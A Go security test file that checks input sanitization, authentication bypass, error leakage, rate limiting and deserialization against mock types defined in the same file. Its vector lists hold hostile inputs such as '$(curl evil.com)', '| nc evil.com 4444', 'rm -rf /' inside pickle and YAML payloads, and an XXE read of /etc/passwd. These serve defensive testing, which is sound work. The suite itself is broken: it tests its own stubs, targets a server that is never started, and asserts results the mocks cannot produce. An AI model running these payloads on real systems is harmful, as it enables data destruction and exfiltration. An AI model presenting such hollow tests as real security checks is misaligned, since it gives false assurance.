// T015-A, T015-B, T015-C, T015-D, T015-E: Security and error boundary testing
package security

import (
	"context"
	"fmt"
	"io"
	"net"
	"net/http"
	"strings"
	"sync"
	"sync/atomic"
	"testing"
	"time"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

// T015-A: Input sanitization testing to prevent injection attacks
func TestInputSanitization_SQLInjection(t *testing.T) {
	service := setupSecureService(t)
	ctx := context.Background()

	// SQL injection test vectors
	injectionVectors := []struct {
		name     string
		input    string
		field    string
		expected string
	}{
		{
			name:     "basic SQL injection",
			input:    "'; DROP TABLE records; --",
			field:    "name",
			expected: "sanitized",
		},
		{
			name:     "union injection",
			input:    "' UNION SELECT * FROM users --",
			field:    "search",
			expected: "sanitized",
		},
		{
			name:     "blind SQL injection",
			input:    "1' AND '1'='1",
			field:    "id",
			expected: "sanitized",
		},
		{
			name:     "time-based injection",
			input:    "1'; WAITFOR DELAY '00:00:05'--",
			field:    "value",
			expected: "sanitized",
		},
		{
			name:     "stacked queries",
			input:    "1'; INSERT INTO admin VALUES ('hacker', 'password')--",
			field:    "query",
			expected: "sanitized",
		},
		{
			name:     "comment injection",
			input:    "admin'/*",
			field:    "username",
			expected: "sanitized",
		},
		{
			name:     "hex encoding",
			input:    "0x27204F522031273D2731",
			field:    "data",
			expected: "sanitized",
		},
		{
			name:     "unicode encoding",
			input:    "\\u0027 OR \\u00271\\u0027=\\u00271",
			field:    "unicode",
			expected: "sanitized",
		},
	}

	for _, tc := range injectionVectors {
		t.Run(tc.name, func(t *testing.T) {
			// Attempt injection
			result, err := service.ProcessInput(ctx, tc.field, tc.input)

			// Should not error, but should sanitize
			assert.NoError(t, err)
			assert.NotContains(t, result, "DROP")
			assert.NotContains(t, result, "UNION")
			assert.NotContains(t, result, "INSERT")
			assert.NotContains(t, result, "--")

			// Verify no database modification occurred
			dbState := service.GetDatabaseState()
			assert.Equal(t, "intact", dbState)
		})
	}
}

func TestInputSanitization_NoSQLInjection(t *testing.T) {
	service := setupSecureService(t)
	ctx := context.Background()

	// NoSQL injection vectors for document databases
	noSQLVectors := []struct {
		name  string
		input map[string]interface{}
	}{
		{
			name: "operator injection",
			input: map[string]interface{}{
				"username": map[string]interface{}{
					"$ne": nil,
				},
			},
		},
		{
			name: "regex injection",
			input: map[string]interface{}{
				"name": map[string]interface{}{
					"$regex": ".*",
				},
			},
		},
		{
			name: "javascript injection",
			input: map[string]interface{}{
				"$where": "function() { return true; }",
			},
		},
	}

	for _, tc := range noSQLVectors {
		t.Run(tc.name, func(t *testing.T) {
			result, err := service.ProcessDocument(ctx, tc.input)
			assert.NoError(t, err)
			assert.NotContains(t, result, "$")
			assert.NotContains(t, result, "function")
		})
	}
}

func TestInputSanitization_CommandInjection(t *testing.T) {
	service := setupSecureService(t)
	ctx := context.Background()

	// Command injection vectors
	commandVectors := []string{
		"; ls -la",
		"| cat /etc/passwd",
		"&& rm -rf /",
		"`whoami`",
		"$(curl evil.com)",
		"; shutdown -h now",
		">/etc/hosts",
		"| nc evil.com 4444",
	}

	for _, vector := range commandVectors {
		t.Run(vector, func(t *testing.T) {
			result, err := service.ExecuteCommand(ctx, vector)

			// Should either error or sanitize
			if err == nil {
				assert.NotContains(t, result, "passwd")
				assert.NotContains(t, result, "shutdown")
				assert.NotContains(t, result, "nc ")
			}
		})
	}
}

func TestInputSanitization_XSS(t *testing.T) {
	service := setupSecureService(t)
	ctx := context.Background()

	// XSS injection vectors
	xssVectors := []struct {
		name     string
		input    string
		expected string
	}{
		{
			name:     "script tag",
			input:    "<script>alert('XSS')</script>",
			expected: "&lt;script&gt;alert('XSS')&lt;/script&gt;",
		},
		{
			name:     "img onerror",
			input:    "<img src=x onerror=alert('XSS')>",
			expected: "&lt;img src=x onerror=alert('XSS')&gt;",
		},
		{
			name:     "javascript protocol",
			input:    "<a href='javascript:alert(1)'>Click</a>",
			expected: "&lt;a href='javascript:alert(1)'&gt;Click&lt;/a&gt;",
		},
		{
			name:     "event handler",
			input:    "<div onmouseover='alert(1)'>Hover</div>",
			expected: "&lt;div onmouseover='alert(1)'&gt;Hover&lt;/div&gt;",
		},
	}

	for _, tc := range xssVectors {
		t.Run(tc.name, func(t *testing.T) {
			result := service.SanitizeHTML(ctx, tc.input)
			assert.Equal(t, tc.expected, result)
			assert.NotContains(t, result, "<script")
			assert.NotContains(t, result, "javascript:")
		})
	}
}

// T015-B: Authentication bypass testing for protected endpoints
func TestAuthentication_BypassAttempts(t *testing.T) {
	server := setupTestServer(t)
	defer server.Close()

	// Authentication bypass attempts
	bypassAttempts := []struct {
		name    string
		headers map[string]string
		path    string
		wantErr bool
	}{
		{
			name:    "missing token",
			headers: map[string]string{},
			path:    "/api/protected",
			wantErr: true,
		},
		{
			name: "invalid token format",
			headers: map[string]string{
				"Authorization": "InvalidToken",
			},
			path:    "/api/protected",
			wantErr: true,
		},
		{
			name: "expired token",
			headers: map[string]string{
				"Authorization": "Bearer " + generateExpiredToken(),
			},
			path:    "/api/protected",
			wantErr: true,
		},
		{
			name: "malformed JWT",
			headers: map[string]string{
				"Authorization": "Bearer malformed.jwt.token",
			},
			path:    "/api/protected",
			wantErr: true,
		},
		{
			name: "SQL injection in token",
			headers: map[string]string{
				"Authorization": "Bearer ' OR '1'='1",
			},
			path:    "/api/protected",
			wantErr: true,
		},
		{
			name: "path traversal",
			headers: map[string]string{
				"Authorization": generateValidToken(),
			},
			path:    "/api/../../admin",
			wantErr: true,
		},
		{
			name: "header injection",
			headers: map[string]string{
				"Authorization": generateValidToken(),
				"X-User-ID":     "admin\r\nX-Admin: true",
			},
			path:    "/api/protected",
			wantErr: true,
		},
		{
			name: "null byte injection",
			headers: map[string]string{
				"Authorization": "Bearer " + generateValidToken() + "\x00admin",
			},
			path:    "/api/protected",
			wantErr: true,
		},
	}

	for _, tc := range bypassAttempts {
		t.Run(tc.name, func(t *testing.T) {
			req, err := http.NewRequest("GET", server.URL+tc.path, nil)
			require.NoError(t, err)

			for key, value := range tc.headers {
				req.Header.Set(key, value)
			}

			resp, err := http.DefaultClient.Do(req)
			require.NoError(t, err)
			defer resp.Body.Close()

			if tc.wantErr {
				assert.Equal(t, http.StatusUnauthorized, resp.StatusCode)
			} else {
				assert.Equal(t, http.StatusOK, resp.StatusCode)
			}
		})
	}
}

func TestAuthentication_PrivilegeEscalation(t *testing.T) {
	service := setupSecureService(t)
	ctx := context.Background()

	// Create regular user context
	userCtx := context.WithValue(ctx, "user_role", "user")
	userCtx = context.WithValue(userCtx, "user_id", "user123")

	// Attempt privilege escalation
	escalationAttempts := []struct {
		name      string
		operation string
		params    map[string]interface{}
		shouldFail bool
	}{
		{
			name:      "access admin endpoint",
			operation: "admin.users.list",
			params:    map[string]interface{}{},
			shouldFail: true,
		},
		{
			name:      "modify other user",
			operation: "user.update",
			params: map[string]interface{}{
				"user_id": "admin",
				"role":    "admin",
			},
			shouldFail: true,
		},
		{
			name:      "delete system data",
			operation: "system.purge",
			params:    map[string]interface{}{},
			shouldFail: true,
		},
		{
			name:      "access own data",
			operation: "user.profile",
			params: map[string]interface{}{
				"user_id": "user123",
			},
			shouldFail: false,
		},
	}

	for _, tc := range escalationAttempts {
		t.Run(tc.name, func(t *testing.T) {
			err := service.ExecuteOperation(userCtx, tc.operation, tc.params)
			if tc.shouldFail {
				assert.Error(t, err)
				assert.Contains(t, err.Error(), "unauthorized")
			} else {
				assert.NoError(t, err)
			}
		})
	}
}

// T015-C: Error information leakage testing
func TestErrorLeakage_StackTraces(t *testing.T) {
	server := setupTestServer(t)
	defer server.Close()

	// Trigger various errors
	errorTriggers := []struct {
		name     string
		path     string
		payload  string
		checkFor []string // Should NOT contain these
	}{
		{
			name:    "database error",
			path:    "/api/query",
			payload: `{"query": "INVALID SQL"}`,
			checkFor: []string{
				"database/sql",
				"gorm.io",
				"stack trace",
				"panic",
				"goroutine",
			},
		},
		{
			name:    "file not found",
			path:    "/api/file",
			payload: `{"path": "/etc/passwd"}`,
			checkFor: []string{
				"/etc/passwd",
				"os.Open",
				"no such file",
				"syscall",
			},
		},
		{
			name:    "parsing error",
			path:    "/api/parse",
			payload: `{invalid json`,
			checkFor: []string{
				"json.Unmarshal",
				"syntax error",
				"line number",
			},
		},
		{
			name:    "internal panic",
			path:    "/api/crash",
			payload: `{"trigger": "panic"}`,
			checkFor: []string{
				"runtime.panic",
				"runtime.Stack",
				"debug.Stack",
			},
		},
	}

	for _, tc := range errorTriggers {
		t.Run(tc.name, func(t *testing.T) {
			resp, err := http.Post(
				server.URL+tc.path,
				"application/json",
				strings.NewReader(tc.payload),
			)
			require.NoError(t, err)
			defer resp.Body.Close()

			body := readBody(t, resp.Body)

			// Check that sensitive information is not leaked
			for _, sensitive := range tc.checkFor {
				assert.NotContains(t, body, sensitive,
					"Response should not contain: %s", sensitive)
			}

			// Should return generic error message
			assert.Contains(t, body, "error")
			assert.NotContains(t, body, "stack")
		})
	}
}

func TestErrorLeakage_ConfigurationDetails(t *testing.T) {
	service := setupSecureService(t)
	ctx := context.Background()

	// Try to extract configuration details
	probes := []struct {
		name      string
		operation string
		expected  string
	}{
		{
			name:      "database connection string",
			operation: "getConfig('database.url')",
			expected:  "configuration not accessible",
		},
		{
			name:      "API keys",
			operation: "getConfig('api.secret')",
			expected:  "configuration not accessible",
		},
		{
			name:      "internal endpoints",
			operation: "getConfig('internal.endpoints')",
			expected:  "configuration not accessible",
		},
	}

	for _, probe := range probes {
		t.Run(probe.name, func(t *testing.T) {
			result, err := service.ProcessQuery(ctx, probe.operation)
			if err != nil {
				assert.Contains(t, err.Error(), "not accessible")
			} else {
				assert.NotContains(t, result, "password")
				assert.NotContains(t, result, "secret")
				assert.NotContains(t, result, "key")
			}
		})
	}
}

// T015-D: Rate limiting effectiveness testing against DoS attacks
func TestRateLimiting_DoSProtection(t *testing.T) {
	server := setupTestServerWithRateLimit(t, 10, time.Second) // 10 req/sec
	defer server.Close()

	// Metrics
	var successCount int64
	var rateLimitedCount int64
	totalRequests := 100
	concurrentClients := 10

	var wg sync.WaitGroup
	wg.Add(concurrentClients)

	start := time.Now()

	// Simulate DoS attack
	for i := 0; i < concurrentClients; i++ {
		go func(clientID int) {
			defer wg.Done()

			for j := 0; j < totalRequests/concurrentClients; j++ {
				resp, err := http.Get(server.URL + "/api/data")
				if err != nil {
					continue
				}

				if resp.StatusCode == http.StatusTooManyRequests {
					atomic.AddInt64(&rateLimitedCount, 1)
				} else if resp.StatusCode == http.StatusOK {
					atomic.AddInt64(&successCount, 1)
				}

				resp.Body.Close()
			}
		}(i)
	}

	wg.Wait()
	duration := time.Since(start)

	// Verify rate limiting worked
	expectedMax := int64(duration.Seconds() * 10 * 1.1) // 10% margin
	assert.LessOrEqual(t, successCount, expectedMax)
	assert.Greater(t, rateLimitedCount, int64(0))

	t.Logf("Rate limit test: %d allowed, %d rate limited out of %d requests",
		successCount, rateLimitedCount, totalRequests)
}

func TestRateLimiting_SlowlorisAttack(t *testing.T) {
	server := setupTestServerWithTimeout(t, 5*time.Second)
	defer server.Close()

	// Simulate Slowloris attack (slow headers)
	conn, err := net.Dial("tcp", server.Addr)
	require.NoError(t, err)
	defer conn.Close()

	// Send headers very slowly
	_, err = conn.Write([]byte("GET /api/data HTTP/1.1\r\n"))
	require.NoError(t, err)

	time.Sleep(1 * time.Second)
	_, err = conn.Write([]byte("Host: localhost\r\n"))
	require.NoError(t, err)

	time.Sleep(4 * time.Second)
	_, err = conn.Write([]byte("\r\n"))

	// Connection should be closed by timeout
	buf := make([]byte, 1024)
	conn.SetReadDeadline(time.Now().Add(2 * time.Second))
	_, err = conn.Read(buf)
	assert.Error(t, err) // Should timeout or connection closed
}

// T015-E: Data validation testing with malicious payloads
func TestDataValidation_MaliciousPayloads(t *testing.T) {
	service := setupSecureService(t)
	ctx := context.Background()

	// Malicious payloads
	payloads := []struct {
		name    string
		payload interface{}
		field   string
		wantErr bool
	}{
		{
			name:    "buffer overflow attempt",
			payload: strings.Repeat("A", 1000000),
			field:   "name",
			wantErr: true,
		},
		{
			name:    "null byte injection",
			payload: "test\x00admin",
			field:   "username",
			wantErr: true,
		},
		{
			name:    "unicode normalization",
			payload: "ﾒﾀﾙ",
			field:   "text",
			wantErr: false, // Should normalize
		},
		{
			name:    "zip bomb",
			payload: generateZipBomb(),
			field:   "file",
			wantErr: true,
		},
		{
			name:    "XML bomb",
			payload: generateXMLBomb(),
			field:   "xml",
			wantErr: true,
		},
		{
			name:    "regex DoS",
			payload: "aaaaaaaaaaaaaaaaaaaaaaaaaaaa!",
			field:   "pattern",
			wantErr: true,
		},
		{
			name:    "integer overflow",
			payload: int64(9223372036854775807),
			field:   "count",
			wantErr: false, // Should handle gracefully
		},
		{
			name:    "format string",
			payload: "%s%s%s%s%s%s%s%s%s%s",
			field:   "format",
			wantErr: true,
		},
		{
			name:    "LDAP injection",
			payload: "*)(uid=*))(|(uid=*",
			field:   "ldap",
			wantErr: true,
		},
		{
			name:    "XXE injection",
			payload: `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>`,
			field:   "xml",
			wantErr: true,
		},
	}

	for _, tc := range payloads {
		t.Run(tc.name, func(t *testing.T) {
			err := service.ValidateInput(ctx, tc.field, tc.payload)
			if tc.wantErr {
				assert.Error(t, err)
			} else {
				assert.NoError(t, err)
			}
		})
	}
}

func TestDataValidation_DeserializationAttacks(t *testing.T) {
	service := setupSecureService(t)
	ctx := context.Background()

	// Deserialization attack payloads
	attacks := []struct {
		name    string
		format  string
		payload string
	}{
		{
			name:   "pickle injection",
			format: "pickle",
			payload: "cos\nsystem\n(S'rm -rf /'\ntR.",
		},
		{
			name:   "yaml injection",
			format: "yaml",
			payload: `!!python/object/apply:os.system ["rm -rf /"]`,
		},
		{
			name:   "json prototype pollution",
			format: "json",
			payload: `{"__proto__": {"isAdmin": true}}`,
		},
	}

	for _, attack := range attacks {
		t.Run(attack.name, func(t *testing.T) {
			result, err := service.Deserialize(ctx, attack.format, []byte(attack.payload))

			// Should either error or sanitize
			if err == nil {
				assert.NotContains(t, fmt.Sprintf("%v", result), "isAdmin")
				assert.NotContains(t, fmt.Sprintf("%v", result), "__proto__")
			}
		})
	}
}

// Benchmark security checks
func BenchmarkInputSanitization(b *testing.B) {
	service := setupSecureService(b)
	ctx := context.Background()

	inputs := []string{
		"normal input",
		"'; DROP TABLE users; --",
		"<script>alert('xss')</script>",
		"../../etc/passwd",
	}

	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		input := inputs[i%len(inputs)]
		_, _ = service.SanitizeInput(ctx, input)
	}
}

// Helper functions
func setupSecureService(t testing.TB) *SecureService {
	return &SecureService{}
}

func setupTestServer(t testing.TB) *TestServer {
	return &TestServer{
		URL: "http://localhost:8080",
	}
}

func setupTestServerWithRateLimit(t testing.TB, rate int, window time.Duration) *TestServer {
	return &TestServer{
		URL: "http://localhost:8080",
		RateLimit: &RateLimit{
			Rate:   rate,
			Window: window,
		},
	}
}

func setupTestServerWithTimeout(t testing.TB, timeout time.Duration) *TestServer {
	return &TestServer{
		URL:     "http://localhost:8080",
		Addr:    "localhost:8080",
		Timeout: timeout,
	}
}

func generateExpiredToken() string {
	// Generate an expired JWT token
	return "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE1MTYyMzkwMjJ9.invalid"
}

func generateValidToken() string {
	// Generate a valid test token
	return "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjk5OTk5OTk5OTl9.valid"
}

func generateZipBomb() []byte {
	// Generate a small zip bomb for testing
	// This is safe for testing as it's limited in size
	return []byte{0x50, 0x4b, 0x03, 0x04}
}

func generateXMLBomb() string {
	// Generate XML entity expansion attack
	return `<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;">
]>
<lolz>&lol2;</lolz>`
}

func readBody(t testing.TB, body io.Reader) string {
	data, err := io.ReadAll(body)
	require.NoError(t, err)
	return string(data)
}

// Mock types for testing
type SecureService struct{}

func (s *SecureService) ProcessInput(ctx context.Context, field, input string) (string, error) {
	// Mock sanitization
	if strings.Contains(input, "DROP") || strings.Contains(input, "UNION") {
		return "sanitized", nil
	}
	return input, nil
}

func (s *SecureService) GetDatabaseState() string {
	return "intact"
}

func (s *SecureService) ProcessDocument(ctx context.Context, doc map[string]interface{}) (string, error) {
	// Mock NoSQL sanitization
	return "sanitized", nil
}

func (s *SecureService) ExecuteCommand(ctx context.Context, cmd string) (string, error) {
	// Mock command execution with sanitization
	if strings.Contains(cmd, ";") || strings.Contains(cmd, "|") {
		return "", fmt.Errorf("invalid command")
	}
	return "safe output", nil
}

func (s *SecureService) SanitizeHTML(ctx context.Context, html string) string {
	// Basic HTML sanitization
	html = strings.ReplaceAll(html, "<", "&lt;")
	html = strings.ReplaceAll(html, ">", "&gt;")
	return html
}

func (s *SecureService) ExecuteOperation(ctx context.Context, op string, params map[string]interface{}) error {
	role := ctx.Value("user_role")
	if role != "admin" && strings.HasPrefix(op, "admin.") {
		return fmt.Errorf("unauthorized")
	}
	return nil
}

func (s *SecureService) ProcessQuery(ctx context.Context, query string) (string, error) {
	if strings.Contains(query, "getConfig") {
		return "", fmt.Errorf("configuration not accessible")
	}
	return "query result", nil
}

func (s *SecureService) ValidateInput(ctx context.Context, field string, input interface{}) error {
	// Mock validation
	switch v := input.(type) {
	case string:
		if len(v) > 10000 || strings.Contains(v, "\x00") {
			return fmt.Errorf("invalid input")
		}
	}
	return nil
}

func (s *SecureService) Deserialize(ctx context.Context, format string, data []byte) (interface{}, error) {
	// Mock safe deserialization
	if strings.Contains(string(data), "__proto__") {
		return nil, fmt.Errorf("invalid payload")
	}
	return map[string]interface{}{}, nil
}

func (s *SecureService) SanitizeInput(ctx context.Context, input string) (string, error) {
	// Mock input sanitization
	return "sanitized", nil
}

type TestServer struct {
	URL       string
	Addr      string
	RateLimit *RateLimit
	Timeout   time.Duration
}

func (s *TestServer) Close() {}

type RateLimit struct {
	Rate   int
	Window time.Duration
}